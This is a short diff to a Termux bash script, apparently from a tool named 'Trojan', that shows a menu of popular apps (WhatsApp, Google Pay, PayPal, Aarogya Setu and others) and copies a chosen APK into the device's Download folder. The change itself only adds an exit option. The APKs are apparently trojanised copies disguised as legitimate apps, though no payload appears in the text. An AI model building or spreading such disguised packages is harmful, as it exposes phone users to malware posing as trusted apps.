@@ -13,18 +13,20 @@ fi ; }
 program() {
 if [ -f "/data/data/com.termux/files/home/Trojan/database/Facebook.apk" ];then
 echo -e "\e[1m
-[01] Aarogya Setu   [07] Facebook       [13] Google Pay      [19] PPSSPP
-[02] Calculator     [08] Files          [14] Google Photos   [20] Paypal
-[03] Calendar       [09] Flipkart       [15] Google          [21] Play Store
-[04] Camera         [10] Gmail          [16] Instagram       [22] Spotify
-[05] Elite          [11] Google Drive   [17] Messenger Lite  [23] Termux
-[06] Facebook Lite  [12] Google Keep    [18] Operamini       [24] WhatsApp
+[01] Aarogya Setu   [07] Facebook       [13] Google Pay      [19] PPSSPP     [0]
+[02] Calculator     [08] Files          [14] Google Photos   [20] Paypal     | |
+[03] Calendar       [09] Flipkart       [15] Google          [21] Play Store |E|
+[04] Camera         [10] Gmail          [16] Instagram       [22] Spotify    |X|
+[05] Elite          [11] Google Drive   [17] Messenger Lite  [23] Termux     |I|
+[06] Facebook Lite  [12] Google Keep    [18] Operamini       [24] WhatsApp   |T|
 \e[0m" | lolcat -a -s 100 -d 1 -t
 
 printf "\e[1;92m[*] Choose an option : \e[0m"
 read options
 
-if [[ $options = "1" ]] || [[ $options = "01" ]];then
+if [[ $options = "0" ]] || [[ $options = "00" ]];then echo;exit
+
+elif [[ $options = "1" ]] || [[ $options = "01" ]];then
 storage
 if [ ! -f '/storage/emulated/0/Download/Aarogya-Setu.apk' ];then
 cp Aarogya-Setu.apk /sdcard/Download
